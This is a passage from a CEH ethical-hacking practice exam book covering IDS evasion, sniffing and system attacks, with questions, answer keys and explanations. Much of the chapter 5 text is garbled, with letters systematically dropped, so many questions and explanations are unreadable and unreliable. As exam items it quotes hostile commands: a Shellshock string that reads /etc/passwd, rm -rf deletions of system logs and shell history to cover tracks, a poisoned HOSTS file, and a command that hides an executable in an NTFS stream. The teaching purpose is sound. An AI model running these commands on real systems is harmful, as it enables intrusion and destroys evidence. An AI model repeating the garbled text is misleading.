HTTP-related functions, vulnerability scanning, exploitation, and IDS evasion.
In fact, some scanners actually use libwhisker for session splicing in order to scan
without being seen.

Chapter 4: Sniffing and Evasion

103

04-ch04.indd 103 11/04/22 11:42 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 4

☐✗ A is incorrect because Nessus is a vulnerability scanner and, on its own, is not
designed to evade IDS detection.

☐✗ B is incorrect because Nikto, like Nessus, is a vulnerability scanner and, on its own, is
not designed to evade IDS detection.

☐✗ D is incorrect because Snort is an IDS itself. Snort is also a perfectly acceptable sniffer.

16. An attacker somehow manages to connect a rogue switch onto an enterprise network
segment. He configures the switch with a priority lower than any other on the network.
Assuming this attempt is successful, which of the following statements is true?

A. The rogue switch will cause broadcast loops and eventually DoS the segment.

B. The rogue switch will become the root bridge, allowing the attacker to sniff network
traffic.

C. DHCP will no longer function on the segment.

D. None of the above.

☑ B. Let’s address the obvious up front: if your security is so weak someone can simply
walk into your offices and connect a switch—a switch—to your network without
anyone noticing, you have no security. OK, that said, let’s address the question’s
intent. EC-Council defines a “new” type of sniffing attack called an STP attack. STP
is a protocol used by switches to prevent broadcast loops within a segment. Basically,
the switches talk to one another and figure out which device has the lowest priority
(and in STP, the lowest number indicates the highest priority). This switch becomes
the root bridge, and broadcast storms are checked.

The idea here is the attacker uses STP to his advantage by forcing the rogue device
to become the bridge and setting its priority to zero, which helps in sniffing traffic
across multiple switches.

☐✗ A is incorrect because STP is designed specifically to prevent these storms, and
adding another device—even a rogue one—wouldn’t change that.

☐✗ C is incorrect because this action would have no effect whatsoever on DHCP.

☐✗ D is incorrect because there is a correct answer provided.

17. Your IDS sits on the network perimeter and has been analyzing traffic for a couple of
weeks. On arrival one morning, you find the IDS has alerted on a spike in network traffic
late the previous evening. Which type of IDS are you using?

A. Stateful

B. Snort

C. Passive

D. Signature based

E. Anomaly based

CEH Certified Ethical Hacker Practice Exams

104

04-ch04.indd 104 11/04/22 11:42 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 4

☑ E. The scenario described here is precisely what an anomaly- or behavior-based system
is designed for. The system watches traffic and, over time, develops an idea of what
“normal” traffic looks like—everything from source and destinations, ports in use, and
times of higher data flows. In one sense, it’s better than a plain signature-based system
because it can find things heuristically based on behavior; however, anomaly-based
systems are notorious for the number of false positives they spin off—especially early on.

☐✗ A is incorrect because stateful refers to a firewall type, not an IDS.

☐✗ B is incorrect because Snort is a signature-based IDS.

☐✗ C is incorrect because the term passive isn’t associated with IDS. Now, an IDS can
react to an alert by taking action to stop or prevent an attack, but this is referred to as
an intrusion prevention system (IPS), not active or passive.

☐✗ D is incorrect because a signature-based IDS isn’t going to care about the amount of
traffic going by, or what time it occurs. A signature-based IDS simply compares each
packet against a list (signature file) you configure it to look at. If nothing matches in
the signature file, then no action is taken.

18. You are performing an ACK scan against a target subnet. You previously verified
connectivity to several hosts within the subnet but want to verify all live hosts on the
subnet. Your scan, however, is not receiving any replies. Which type of firewall is most
likely in use at your location?

A. Packet filtering

B. IPS

C. Stateful

D. Active

☑ C. Most people think of a firewall as a simple packet filter, examining packets as they
are coming in against an access list—if the port is allowed, let the packet through.
However, the stateful inspection firewall has the ability to examine the session details
regarding the packet and make a determination on its state. For a common (dare I
say, textbook) example, if a stateful firewall receives an ACK packet, it’s smart enough
to know whether there is an associated SYN packet that originated from inside the
network to go along with it. If there isn’t—that is, if communications did not start
from inside the subnet—it’ll drop the packet.

☐✗ A is incorrect because a packet-filtering firewall wouldn’t bother with the flags. It
would be concerned about what port the packet was headed to. If, for instance, you
host a web page out of that subnet but not an FTP server, your firewall should be set
up to allow port 80 in but not port 21.

☐✗ B is incorrect because an intrusion prevention system (IPS) isn’t a firewall at all. It’s a
network-monitoring solution that has the capability of recognizing malicious traffic
and taking action to prevent or stop the attack.

☐✗ D is incorrect because the term active is not associated with a firewall type. This is
included as a distractor.

Chapter 4: Sniffing and Evasion

105

04-ch04.indd 105 11/04/22 11:42 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 4

19. You are separated from your target subnet by a firewall. The firewall is correctly configured
and allows requests only to ports opened by the administrator. In firewalking the device,
you find that port 80 is open. Which technique could you employ to send data and
commands to or from the target system?

A. Encrypt the data to hide it from the firewall.

B. Use session splicing.

C. Use MAC flooding.

D. Use HTTP tunneling.

☑ D. HTTP tunneling is a successful “hacking” technique. (Microsoft makes use of
HTTP tunneling for lots of things, and it has been doing so for years.) The tactic is
fairly simple: because port 80 is almost never filtered by a firewall, you can craft port
80 segments to carry a payload for protocols the firewall may have otherwise blocked.
Of course, you’ll need something on the other end to pull the payload out of all those
port 80 packets that IIS is desperately wanting to answer, but that’s not altogether
difficult.

☐✗ A is incorrect because encryption won’t do a thing for you here. The firewall isn’t
looking necessarily at content/payload—it’s looking at the packet/frame header and
port information. Encryption is a good choice to get around an IDS, not a firewall.

☐✗ B is incorrect because session splicing is a technique for evading an IDS, not a
firewall. Again, the firewall is interested in the packet and frame header, not what
fragments of code you’ve hidden in the payload.

☐✗ C is incorrect because MAC flooding is a technique for sniffing switches. The idea
is to fill the CAM table to the brim with thousands of useless MAC addresses. This
effectively turns the switch into a hub, because it is too confused to filter and just
begins flooding all traffic to all ports.

20. Which of the following tools can be used to extract Application layer data from TCP
connections captured in a log file into separate files?

A. Snort

B. Netcat

C. TCPflow

D. Tcpdump

☑ C. Per its GitHub page (https://github.com/simsong/tcpflow/wiki/tcpflow-
%E2%80%94-A-tcp-ip-session-reassembler), TCPflow is “a program that captures
data transmitted as part of TCP connections (flows), and stores the data in a way
that is convenient for protocol analysis and debugging. Each TCP flow is stored
in its own file. Thus, the typical TCP flow will be stored in two files, one for each
direction. tcpflow can also process stored ‘tcpdump’ packet flows.... tcpflow is
similar to ‘tcpdump,’ in that both process packets from the wire or from a stored file.

CEH Certified Ethical Hacker Practice Exams

106

04-ch04.indd 106 11/04/22 11:42 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 4

But it’s different in that it reconstructs the actual data streams and stores each flow
in a separate file for later analysis.”

☐✗ A is incorrect because Snort is a great IDS, sniffer, and packet logger, but it isn’t so
great at separating TCP streams for Application layer analysis.

☐✗ B is incorrect because netcat (the “Swiss Army knife of hacking,” as it’s called) isn’t
designed for sniffing and packet analysis.

☐✗ D is incorrect because tcpdump will certainly pull everything for you, but it does
not reconstruct the actual data streams or store each flow in a separate file for later
analysis.

21. Examine the Wireshark filter shown here:
ip.src == 192.168.1.1 &&tcp.srcport == 80

Which of the following correctly describes the capture filter?

A. The results will display all traffic from 192.168.1.1 destined for port 80.

B. The results will display all HTTP traffic to 192.168.1.1.

C. The results will display all HTTP traffic from 192.168.1.1.

D. No results will display because of invalid syntax.

☑ C. Wireshark filters will be covered quite a bit on your exam, and, as stated earlier,
these are easy questions for you. The preceding syntax designates the source IP and
combines it with a source TCP port. This is effectively looking at answers to port
80 requests by 192.168.1.1. As another important study tip, watch for the period
(.) between “ip” and “src” on the exam because they’ll drop it or change it to a dash
(-) to trick you. And lastly, for real-world application, it’s important to note that
Wireshark considers certain friendly terms such as HTTP as simple placeholders
for the actual port. This means in Wireshark (at least as far as CEH is concerned),
HTTP and 80 are more or less identical. As a budding ethical hacker, you should
know by now that just because something is traveling on port 80 doesn’t mean it’s
HTTP traffic.

☐✗ A is incorrect because port 80 is defined as the source port, not the destination;
192.168.1.1 is answering a request for an HTML page.

☐✗ B is incorrect because 192.168.1.1 is defined as the source address, not the destination.

☐✗ D is incorrect because the syntax is indeed correct.

22. You need to put the NIC into listening mode on your Linux box, capture packets, and
write the results to a log file named my.log. How do you accomplish this with tcpdump?

A. tcpdump -i eth0 -w my.log

B. tcpdump -l eth0 -c my.log

C. tcpdump /i eth0 /w my.log

D. tcpdump /l eth0 /c my.log

Chapter 4: Sniffing and Evasion

107

04-ch04.indd 107 11/04/22 11:42 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 4

☑ A. Tcpdump syntax is simple: tcpdump flag(s) interface. The -i flag specifies the
interface (in this example, eth0) for tcpdump to listen on, and the -w flag defines
where you want your packet log to go. For your own study, be aware that many study
references—including EC-Council’s official reference books—state that the -i flag
“puts the interface into listening mode.” It doesn’t actually modify the interface at all,
so this is a little bit of a misnomer—it just identifies to tcpdump which interface to
listen on for traffic. Also, be aware that the -w flag dumps traffic in binary format. If
you want the traffic to be readable, you’ll need to have it display onscreen. Better yet,
you can dump it to a file using the | designator and a filename.

☐✗ B is incorrect because the -l flag does not put the interface in listening mode; it actually
has to do with line buffering.

☐✗ C and D are incorrect for the same reason; flags are designated with a dash (-), not a
slash (/).

23. Which of the following tools can assist with IDS evasion? (Choose all that apply.)

A. Whisker

B. Fragroute

C. Capsa

D. Wireshark

E. ADMmutate

F. Inundator

☑ A, B, E, F. IDS evasion comes down to a few methods: encryption, flooding, and
fragmentation (session splicing). Whisker is an HTTP scanning tool, but it also
has the ability to craft session-splicing fragments. Fragroute intercepts, modifies, and
rewrites egress traffic destined for the specified host and can be used to fragment an
attack payload over multiple packets. ADMmutate can create multiple scripts that
won’t be easily recognizable by signature files, and Inundator is a flooding tool that
can help you hide in the cover fire.

☐✗ C and D are incorrect because both Capsa (Colasoft) and Wireshark are sniffers.

24. A security administrator is attempting to “lock down” her network and blocks access
from internal to external on all external firewall ports except for TCP 80 and TCP 443.
An internal user wants to make use of other protocols to access services on remote systems
(FTP, as well as some nonstandard port numbers). Which of the following is the most
likely choice the user could attempt to communicate with the remote systems over the
protocol of her choice?

A. Use HTTP tunneling.

B. Send all traffic over UDP instead of TCP.

C. Crack the firewall and open the ports required for communication.

D. MAC flood the switch connected to the firewall.

CEH Certified Ethical Hacker Practice Exams

108

04-ch04.indd 108 11/04/22 11:42 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 4

☑ A. If you happen to own CEH Certified Ethical Hacker All-in-One Exam Guide, Fifth
Edition, the companion book to this practice exams tome, you’re undoubtedly aware
by now I harp on protocols not necessarily being tied to a given port number in the
real world. Sure, FTP is supposed to be on TCP port 21, SMTP is supposed to ride
on 25, and Telnet is supposed to be on 23, but the dirty little truth is they don’t have
to. An HTTP tunnel is a brilliant example of this. To the firewall and everyone else
watching, traffic from your machine is riding harmless little old port 80—nothing to
see here folks, just plain-old, regular HTTP traffic. But a peek inside that harmless
little tunnel shows you can run anything you want. Typically, you connect to an external
server over port 80, and it will unwrap and forward your other protocol traffic for you,
once you’ve gotten it past your pesky firewall.

☐✗ B is incorrect because, well, this is just a ridiculous answer. UDP ports are filtered by
a firewall just like TCP ports, so sending only UDP would be useless.

☐✗ C is incorrect because, while it would certainly allow the communication, it wouldn’t
be for very long. Every sensor on the network would be screaming, and the happy
little security admin would lock it back down ASAP. Not to mention, the user would
get fired.

☐✗ D is incorrect because MAC flooding refers to active sniffing on a switch, not
bypassing a firewall.

25. An ethical hacker is assigned to scan a server and wants to avoid IDS detection. She uses
a tactic wherein the TCP header is split into many packets, making it difficult to detect
what the packets are intended for. Which of the following best describes the technique
employed?

A. TCP scanning

B. IP fragment scanning

C. ACK scanning

D. Inverse TCP scanning

☑ B. There are several methods to attempt evasion of an IDS, and an IP fragmentation
scan is but one of them. It works by splitting the original TCP header into multiple,
smaller packets. Each of those smaller packets, on its own, means a whole lot of
nothing to the IDS, but when reassembled at the destination can, for example, scan
traffic (which is this case here). This is not to say it’s always going to work—almost
nothing is foolproof—but I can almost guarantee you’ll see this particular evasion
technique on your exam somewhere.

☐✗ A, C, and D are all incorrect for the same reason: the type of scan being used has
nothing to do with the evasion method asked about in the question. The evasion
method of splitting the headers into fragmented packets can be used regardless of
scan type.

Chapter 4: Sniffing and Evasion

109

04-ch04.indd 109 11/04/22 11:42 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 4/ Blind Folio: 110

This page intentionally left blank

04-ch04.indd 110 11/04/22 11:42 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 5

CHAPTER

Attacking a System 5
This chapter includes questions from the following topics:

• Describe the CEH hacking methodology and system hacking steps
• Describe methods used to gain access to systems
• Describe methods used to escalate privileges
• Describe methods used to maintain access to systems
• Describe methods of evidence erasure
• Identify rootkit function and types
• Identify basics of Windows and Linux file structure, directories, and commands

Did you kow h’s a scic o had-o-had comba? Pugilism (pygmachia i Gk, mad
io a Olympic spo i 688 BC) is h had-o-had comba spo b kow as boxig.
Dspi h cicus i has bcom i mod ims, boxig was a wll-spcd ad cafully
sudid a fo housads of yas. I’s o jus simply puig wo guys i a ig ad havig hm
ba o ach oh; i’s abou cafig a sagy o accua sghs ad xploi waksss.
Soud familia?

Ad w’ o alkig abou jus boxig h—had-o-had comba aks o may foms.
Pofssioal boxs, fo xampl, migh ll you ha ligh puchs a fas, qui lss gy,
ad lav you lss vulabl. Thy migh also advis you ha dcpio ad spd i comba a
much mo valuabl ha sgh ad h “kockou puch.” Slf-dfs xps migh poi
ou aas of h huma aaomy ha disabl a aack, povidig you a mas of scap. Thy
migh also poi ou higs lik h valu of a kif vsus a gu i dfs siuaios ad ha o
clvly xcud sik, s up ad how wih quickss (somims o v wih pow), may
b all i aks o fusa ad cofus a aack. Th scic of cayig ou a physical aack
o a idividual, ad pocig youslf agais such a aack, is foudd o h picipls of
disac, lvag, ad imig. I’s fasciaig, v if you do’ v pla o big i a siuaio
quiig h kowldg.

You may b siig h havig o ida wha kid of viual damag you ca do wih h
kowldg you’v gaid so fa. Who kows if, pu i h igh siuaio, you’d kock ou viual
ags wih as? I ca s you ow, lookig dow a you kyboad i aw ad aswig h
“How did you do ha?” qusio wih, “I do’ kow—h aiig jus kickd i.” Gad, w
sill hav a lo of aiig o do, ad I doub you’ll b puchig ay viual ags ousid a
agd-upo scop (af all, you a a hical hack, igh?). Howv, his chap will hlp

111

05-ch05.indd 111 12/04/22 10:33 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 5

ho you skills. H, w’ll alk all abou sysm aacks ad puig o us som of h aiig
ad kowldg you alady hav i plac.

STUDY TIPS I’ve got some really good news: not a whole lot has changed in
regard to system attack methodology and steps in this version. As a matter
of fact, it’s largely unchanged from previous versions. Why is this good news?
Because if you’ve paid attention in your study, you should do fine here,

as there’s not a lot of new things designed to trip you up on your exam.
System attacks come in many forms, but EC-Council really likes the password attacks.

Know your password rules, attacks, and tools well. You will definitely see loads of
questions about passwords—the use, storage, and hashing of passwords, as well as
attacks against them, will be covered ad nauseam on your exam. Pull some of these tools
down and play with them because you’ll need to know what they look like, how they
operate, and what capabilities they have.

Next, when it comes to this chapter, you really need to get to know Linux better. No,
seriously—you need to know the Linux command line a lot better. Questions regarding
Linux will most likely revolve around kernel modules, file structures, storage locations,
and the command-line interface. Again, the easiest way to learn all this is to download
a Linux distro and run it in a VM on your machine. Take advantage of the thousands of
Linux how-to videos and articles you can find on the Internet: it’s one thing to read it in
a book, but you’ll learn far more if you actually perform it yourself.

CEH Certified Ethical Hacker Practice Exams

112

05-ch05.indd 112 12/04/22 10:33 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 5

QUESTIONS

1. You a xamiig s logs fom h day’s p s aciviis ad o h followig Q
is o a Widows 10 machi:
C:\> net user
User accounts for \\ANYPC
-------------------------------------------------------------
Administrator Backup DefaultAccount
Guest USER1
The command completed successfully.
C:\> net user USER1 user2

Which of h followig sams is u gadig his y?

A. Th am mmb addd a us accou.

B. Th am mmb swichd his logi o ha of a diff us.

C. Th am mmb chagd h passwod of a us.

D. Th am mmb amd a us accou.

2. Amada woks as a scuiy admiisao fo a lag ogaizaio. Sh discovs som
mo ools isalld o a sv ad has o cod of a chag qus askig fo hm.
Af som ivsigaio, sh discovs a ukow IP addss cocio ha was abl
o accss h wok hough a high-lvl po ha was o closd. Th IP addss is fis
acd o a poxy sv i Mxico. Fuh ivsigaio shows h cocio boucd
bw sval poxy svs i may locaios. Which of h followig is h mos likly
poxy ool usd by h aack o cov hi acks?

A. ISA poxy

B. IAS poxy

C. TOR poxy

D. Nca

3. Th followig HOSTS fil was pulld duig a icid spos:
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
# 102.54.94.97 rhino.acme.com # source server
# 38.25.63.10 x.acme.com # x client host
220.181.0.16 mybank.com
220.181.0.16 amazon.com
220.181.0.16 google.com

Chapter 5: Attacking a System

113

05-ch05.indd 113 12/04/22 10:33 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 5

220.181.0.16 gmail.com
220.181.0.16 facebook.com
# localhost name resolution is handled within DNS itself.
# 127.0.0.1 localhost
# ::1 localhost

Which of h followig sams bs dscibs h HOSTS fil?

A. A us o h machi ampig o go o chck hi bak accou a mybak.com
will b dicd o a Chis IP addss isad.

B. A us o h machi ampig o go o googl.com will civ a HTTP u
cod of 400.

C. A us o h machi ampig o go o gmail.com will dic o h local hos.

D. Ay DNS soluio o IP 220.181.0.16 will b dicd o o of h fiv sis
lisd i oud-obi fashio.

4. Which of h followig ops h Compu Maagm MMC i a Widows
commad li?

A. compmgm.mmc

B. compmgm.msc

C. compmgm.x

D. compumgm.x

5. Which of h followig will xac a xcuabl fil fom NTFS samig?

A. c:\> ca fil1.x:hidd.x > visibl.x

B. c:\> mo fil1.x | hidd.x > visibl.x

C. c:\> yp opad.x > fil1.x:hidd.x

D. c:\> lis fil1.x$hidd.x > visibl.x

6. Which commad is usd o a Liux machi o allow all pivilgs o h us, ad-oly
o h goup, ad ad-oly fo all ohs o a paicula fil?

A. chmod 411 fil1

B. chmod 114 fil1

C. chmod 117 fil1

D. chmod 711 fil1

E. chmod 744 fil1

7. Exami h followig passwd fil:
root:x:0:0:root:/root:/bin/bash
mwalk:x:500:500:Matt Walker,Room 2238,email:/home/mwalk:/bin/sh
jboll:x:501:501:Jason Bollinger,Room 2239,email:/home/jboll:/bin/sh
rbell:x:502:502:Rick Bell,Room 1017,email:/home/rbell:/bin/sh
afrench:x:503:501:Alecia French,Room 1017,email:/home/afrench:/bin/sh

CEH Certified Ethical Hacker Practice Exams

114

05-ch05.indd 114 12/04/22 10:33 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 5

Which of h followig sams a u gadig his passwd fil? (Choos all ha
apply.)

A. No of h us accous has passwods assigd.

B. Th sysm maks us of h shadow fil.

C. Th oo accou passwod is oo.

D. Th oo accou has a shadowd passwod.

E. Fils cad by Alcia will iiially b viwabl by Jaso.

8. You a ampig o hack a Widows machi ad wa o gai a copy of h SAM fil.
Wh ca you fid i? (Choos all ha apply.)

A. /c/passwd

B. /c/shadow

C. c:\widows\sysm32\cofig

D. c:\wi\cofig

E. c:\widows\pai

9. Which of h followig sams a u cocig Kbos? (Choos all ha apply.)

A. Kbos uss symmic cypio.

B. Kbos uss asymmic cypio.

C. Clis ask fo auhicaio icks fom h KDC i cla x.

D. KDC sposs o clis v iclud a passwod.

E. Clis dcyp a TGT fom h sv.

10. Wha is h diffc bw a dicioay aack ad a hybid aack?

A. Dicioay aacks a basd solly o wodliss, whas hybid aacks mak us of
boh wodliss ad aibow abls.

B. Dicioay aacks a basd solly o whol wodliss, whas hybid aacks ca us
a vaiy of ls, umbs, ad spcial chaacs.

C. Dicioay aacks us pdfid wodliss, whas hybid aacks subsiu
umbs ad symbols wihi hos wods.

D. Hybid ad dicioay aacks a h sam.

11. Which of h followig coais a lisig of po umbs fo wll-kow svics
dfid by IANA?

A. %widi%\c\liss

B. %widi%\sysm32\divs\c\lmhoss

C. %widi%\sysm32\divs\c\svics

D. %widi%\sysm32\divs\c\hoss

Chapter 5: Attacking a System

115

05-ch05.indd 115 12/04/22 10:33 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 5

12. Which of h followig SIDs idicas h u admiisao accou?

A. S-1-5-21-1388762127-2960977290-773940301-1100

B. S-1-5-21-1388762127-2960977290-773940301-1101

C. S-1-5-21-1388762127-2960977290-773940301-500

D. S-1-5-21-1388762127-2960977290-773940301-501

13. I which sp of EC-Coucil’s sysm hackig mhodology would you fid
sgaogaphy?

A. Cackig passwods

B. Escalaig pivilgs

C. Excuig applicaios

D. Hidig fils

E. Covig acks

14. A viw of h commad hisoy o a Liux box shows h followig commad d:
env x= '(){ :;};echo exploit ' bash –c 'cat/etc/passwd

Which of h followig is h bs dscipio of wha h aack is ampig o
accomplish?

A. Add a us o h sysm.

B. Elva cu logi pivilgs.

C. Chag passwods fo uss.

D. Display passwod fil cos.

15. You a xamiig LM passwod hashs ad s h followig:

3A02DF5289CF6EEFAAD3B435B51404EE

Which of h followig passwods is mos likly o hav cad h hash?

A. 123456789

B. CEHISHARD

C. c3HisH@RD!

D. CEHhad

16. You a xamiig hisoy logs o a Liux machi ad o h aack addd a
ampsad (&) af a fw pocss commads. Which of h followig sams is u
gadig his?

A. Th & symbol has o ffc o h pocss commad.

B. Th & symbol us h pocss as a backgoud ask ad closs i wh h us logs off.

C. Th & symbol sus h pocss coius o u af h us logs off.

D. Th & symbol cocaas h pocss o subsqu commads.

CEH Certified Ethical Hacker Practice Exams

116

05-ch05.indd 116 12/04/22 10:33 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 5

17. Which of h followig a cosidd offli passwod aacks? (Choos all ha apply.)

A. Usig a hadwa kylogg

B. Bu-foc cackig wih Cai ad Abl o a sol SAM fil

C. Usig Joh h Ripp o a sol passwd fil

D. Should sufig

18. If a ooki is discovd o h sysm, which of h followig is h best alaiv fo
covy?

A. Rplacig all daa fils fom a good backup

B. Isallig Tipwi

C. Rloadig h i sysm fom kow-good mdia

D. Dlig all daa fils ad booig

19. Exami h followig poio of a log fil, capud duig a hackig amp:
[matt@localhost]#rm –rf /tmp/mykit_headers
[matt@localhost]#rm –rf /var/log/messages
[matt@localhost]#rm –rf /root/.bash_history

Wha was h aack ampig o do?

A. Copy fils fo la xamiaio.

B. Cov his acks.

C. Chag h shll o lock ou oh uss.

D. Upload a ooki.

20. You suspc a hack has occud agais you Liux machi. Which commad will display
all uig pocsss fo you o viw?

A. ls -d

B. ls -l

C. su

D. ps -f

E. ifcofig

21. A ogaizaio was o cool wok affic ad pfom saful ispcio of affic
goig io ad ou of is DMZ. Which buil-i fucioaliy of Liux ca achiv his?

A. ipabls

B. ipchais

C. ipsiff

D. ipfiwall

Chapter 5: Attacking a System

117

05-ch05.indd 117 12/04/22 10:33 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 5

22. Which of h followig bs dscibs Cygwi?

A. Cygwi is a Uix subsysm uig o op of Widows.

B. Cygwi is a Widows subsysm uig o op of Uix.

C. Cygwi is a C++ compil.

D. Cygwi is a passwod-cackig ool.

23. Which fold i Liux holds admiisaiv commads ad damos?

A. /sbi

B. /bi

C. /dv

D. /m

E. /us

24. Which of h followig is h appopia mas o pivo wihi a Masploi aack sssio?

A. Us h pivo xploi ousid mp.

B. Rcofigu wok sigs i mp.

C. S h payload o popaga.

D. Ca a ou sam i h mp.

25. You a xamiig fils o a Widows machi ad o o fil’s aibus iclud “h.”
Wha dos his idica?

A. Th fil is flaggd fo backup.

B. Th fil is pa of h hlp fucio.

C. Th fil is fagmd bcaus of siz.

D. Th fil has b quaaid by a aivius pogam.

E. Th fil is hidd.

26. A aack has gaid accss o a ial sysm. Usig Masploi, h accsss ad
aacks oh ial sysms. Which of h followig ms bs dscib h acio ak?

A. Aack spliig

B. Pivoig

C. Aack swigig

D. Higig

CEH Certified Ethical Hacker Practice Exams

118

05-ch05.indd 118 12/04/22 10:33 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 5

27. Which aciv oli aack combis is of o dicioay fil wih hos of a scod
o ga w wodliss fo passwod cackig?

A. Combiao

B. Figpi

C. Toggl-Cas

D. Makov-Chai

28. Which auhicaio mhod uss DES fo cypio ad focs 14-chaac
passwods fo hash soag?

A. NTLMv1

B. NTLMv2

C. LAN Maag

D. Kbos

Chapter 5: Attacking a System

119

05-ch05.indd 119 12/04/22 10:33 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 5

QUICK ANSWER KEY

1. C 11. C 21. A

2. C 12. C 22. A

3. A 13. D 23. A

4. B 14. D 24. D

5. A 15. D 25. E

6. E 16. B 26. B

7. B, D, E 17. A, B, C 27. A

8. C, E 18. C 28. C

9. A, B, C, D, E 19. B

10. C 20. D

CEH Certified Ethical Hacker Practice Exams

120

05-ch05.indd 120 12/04/22 10:33 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 5

ANSWERS

1. You a xamiig s logs fom h day’s p s aciviis ad o h followig A
is o a Widows 10 machi:
C:\> net user
User accounts for \\ANYPC
-------------------------------------------------------------
Administrator Backup DefaultAccount
Guest USER1
The command completed successfully.
C:\> net user USER1 user2

Which of h followig sams is u gadig his y?

A. Th am mmb addd a us accou.

B. Th am mmb swichd his logi o ha of a diff us.

C. Th am mmb chagd h passwod of a us.

D. Th am mmb amd a us accou.

☑ C. Th  commads i Widows will dfiily mak a appaac o you xam,
ad bcaus i’s impossibl o ll which syax o commad sucu will b how a
you, you should la hm all. I his xampl, h net user commad liss all uss o
h machi. Nx, h am mmb usd h net user USERNAME PASSWORD

commad—wh USERNAME quas o h us o upda ad PASSWORD is h
passwod o s fo h us. I his xampl, h us—USER1—had his passwod
updad o us2. Oh net user opios iclud ADD, DELETE, TIMES, ad
ACTIVE. N commads u i h scuiy cox you a loggd o as, so su
you’ acually a admiisao o h machi bfo ampig may of hm. As
a usful asid, kp i mid you’ll pobably s a fw icks lik his (usig “us2” as a
passwod) o you xam. Syax mas, ad i’ll b maipulad qui a bi o you s.

N commads hav may oh uss. Fo xampl, net view will display sysms i
h wokgoup, net use ls you ca, coc o, ad display ifomaio o shad
soucs, net share will lis all h shas h us has accss o, ad net start allows
you o sa a svic.

☐✗ A is icoc bcaus his dos o mach h syax povidd. If h am mmb
wad o add a us, h’d fis su h had admiisaiv pivilgs ad would
h us h net user /ADD USERNAME commad (wh USERNAME is h
am of h us o b cad).

☐✗ B is icoc bcaus his commad o syax would o accomplish his acio.

☐✗ D is icoc bcaus his commad o syax would o accomplish his acio.

2. Amada woks as a scuiy admiisao fo a lag ogaizaio. Sh discovs som
mo ools isalld o a sv ad has o cod of a chag qus askig fo hm.
Af som ivsigaio, sh discovs a ukow IP addss cocio ha was abl
o accss h wok hough a high-lvl po ha was o closd. Th IP addss is fis
acd o a poxy sv i Mxico. Fuh ivsigaio shows h cocio boucd

Chapter 5: Attacking a System

121

05-ch05.indd 121 12/04/22 10:33 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 5

bw sval poxy svs i may locaios. Which of h followig is h mos likly
poxy ool usd by h aack o cov hi acks?

A. ISA poxy

B. IAS poxy

C. TOR poxy

D. Nca

☑ C. I’v miod i bfo, ad I’ll mio i agai h: somims h CEH xam
ad al lif jus do’ mach up. Ys, his qusio may b, admidly, a lil o h
“hoky” sid, bu i’s valid isofa as EC-Coucil is cocd. Th poi h is ha
TOR (Th Oio Rouig; hps://www.opojc.og/) povids a quick, asy, ad
ally goovy way o hid you u idiy wh pfomig almos ayhig oli.
Accodig o h si, “To pocs you by boucig you commuicaios aoud
a disibud wok of lays u by volus all aoud h wold: i pvs
sombody wachig you I cocio fom laig wha sis you visi, ad
i pvs h sis you visi fom laig you physical locaio.” (Fo h al-wold
folks ou h, jus kow ha wihou law focm ad som sious wok
visibiliy, you’d pobably b succssful i ackig o h fis hop, bu ha’d b i.) TOR
is dyamic by au, ad a hack ca simply us a diff pah fo ach aack. Jus
mmb h qusio is ally abou idifyig TOR as a mas of covig acks ad
o cssaily a ais o how i really woks. W his a discussio basd i aliy,
w’d b mo isd i how Amada would dmi h cocio was boucig
aoud poxis i h fis plac: mo alisically, sh migh dc sval simila
cocios lvagig h sam accss ha w comig fom sval diff couis.

☐✗ A is icoc bcaus a I Scuiy ad Acclaio (ISA) sv is’
dsigd o bouc bw mulipl poxis o obscu h oigial souc. P
Micosof, ISA “is h succsso o Micosof’s Poxy Sv 2.0... ad povids h
wo basic svics of a pis fiwall ad a Wb poxy/cach sv. ISA Sv’s
fiwall scs all pack-lvl, cicui-lvl, ad applicaio-lvl affic. Th Wb
cach sos ad svs all gulaly accssd Wb co i od o duc wok
affic ad povid fas accss o fquly-accssd Wb pags. ISA Sv also
schduls dowloads of Wb pag updas fo o-pak ims.”

☐✗ B is icoc bcaus I Auhicaio Svic (IAS) is a compo of svs
ha allows you o povid a Rmo Auhicaio Dial-I Us Svic (RADIUS)
cocio o clis. I’s o dsigd as a obfuscaig poxy—is pupos is i
auhicaio.

